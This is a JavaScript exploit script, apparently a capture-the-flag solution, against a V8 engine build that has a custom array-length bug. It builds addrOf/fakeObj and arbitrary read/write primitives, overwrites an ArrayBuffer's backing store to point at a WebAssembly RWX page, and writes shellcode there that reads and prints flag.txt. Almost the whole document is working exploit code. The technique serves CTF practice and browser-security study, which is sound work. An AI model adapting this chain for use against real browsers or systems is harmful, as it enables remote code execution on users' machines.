arr = [1.1, 2.2];
obj_arr = [{}, {}];
fake_holder = [1.1, 2.2];
buf = new ArrayBuffer(0x1000);

const conv_ab = new ArrayBuffer(8);
const conv_f64 = new Float64Array(conv_ab);
const conv_u64 = new BigUint64Array(conv_ab);

function ftoi(float) {
    conv_f64[0] = float;
    return conv_u64[0];
}

function itof(int) {
    conv_u64[0] = BigInt(int);
    return conv_f64[0];
}

function hex(x) {
  return "0x" + x.toString(16);
}

// %DebugPrint(arr);
// %DebugPrint(obj_arr);
// %DebugPrint(fake_holder);
// %DebugPrint(buf);
// %SystemBreak();

// This sets the length of the array
arr.setHorsepower(0xfffffff);

// Craft first primitives
function addrOf(obj){
    obj_arr[0] = obj;
    return ftoi(arr[5]) & 0xffffffffn;
}

function fakeObj(addr){
    arr[5] = itof(addr);
    return obj_arr[0];
}

arr_header = ftoi(arr[18]);
fake_size = 0x20n;
fake_holder[0] = itof(arr_header);
fake_holder[1] = itof((fake_size << 32n) | arr_header & 0xffffffffn);
fake = fakeObj(addrOf(fake_holder) - 0x10n);

function read64(addr){
    fake_holder[1] = itof((fake_size << 32n) | ((addr-0x8n)& 0xffffffffn));
    return ftoi(fake[0]);
}

function write64(addr, content){
    fake_holder[1] = itof((fake_size << 32n) | ((addr-0x8n)& 0xffffffffn));
    fake[0] = itof(content);
}

// Alloc wasm rwx page
const wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, // Magic + Version
    0x01, 0x07, 0x01, 0x60, 0x02, 0x7f, 0x7f, 0x01, 0x7f, // Type section
    0x03, 0x02, 0x01, 0x00, // Function section
    0x07, 0x07, 0x01, 0x03, 0x66, 0x63, 0x6e, 0x00, 0x00, // Export section
    0x0a, 0x09, 0x01, 0x07, 0x00, 0x20, 0x00, 0x20, 0x01, 0x6a, 0x0b // Code section
]);

let wasm_mod = new WebAssembly.Module(wasm_code);
let wasm_instance = new WebAssembly.Instance(wasm_mod);
let wasm_func = wasm_instance.exports.fcn;

// %DebugPrint(wasm_instance);

// Leak the address of the allcated rwx page
let wasm_instance_addr = addrOf(wasm_instance);
let rwx_page_addr = read64(wasm_instance_addr + 0x68n);

console.log('wasm instance addr: ' + hex(wasm_instance_addr));
console.log('rwx page addr: ' + hex(rwx_page_addr));

// overwrite buf's backing_store ptr with a ptr to the rwx page
write64(addrOf(buf)-0x4n + 0x18n, rwx_page_addr);
console.log("test:", hex(read64(addrOf(buf)-0x4n + 0x18n)));
// %DebugPrint(buf);

// Write shellcode in rwx page
let rwx_view = new DataView(buf);

// open "flag.txt", read and write to stdout
payload = ['0x48', '0x8d', '0x3d', '0x47', '0x0', '0x0', '0x0', '0x48', '0x31', '0xf6', '0x48', '0x31', '0xd2', '0x48', '0xc7', '0xc0', '0x2', '0x0', '0x0', '0x0', '0xf', '0x5', '0x48', '0x89', '0xc7', '0x48', '0x8d', '0x35', '0x37', '0x0', '0x0', '0x0', '0x48', '0xc7', '0xc2', '0x0', '0x1', '0x0', '0x0', '0x48', '0xc7', '0xc0', '0x0', '0x0', '0x0', '0x0', '0xf', '0x5', '0x48', '0xc7', '0xc7', '0x1', '0x0', '0x0', '0x0', '0x48', '0x8d', '0x35', '0x19', '0x0', '0x0', '0x0', '0x48', '0xc7', '0xc2', '0x0', '0x1', '0x0', '0x0', '0x48', '0xc7', '0xc0', '0x1', '0x0', '0x0', '0x0', '0xf', '0x5', '0x66', '0x6c', '0x61', '0x67', '0x2e', '0x74', '0x78', '0x74', '0x0', '0x0'];
for (let i = 0; i < payload.length; i++){
    rwx_view.setInt8(i, payload[i]);
}

// Get shell :)
wasm_func();

// %SystemBreak();
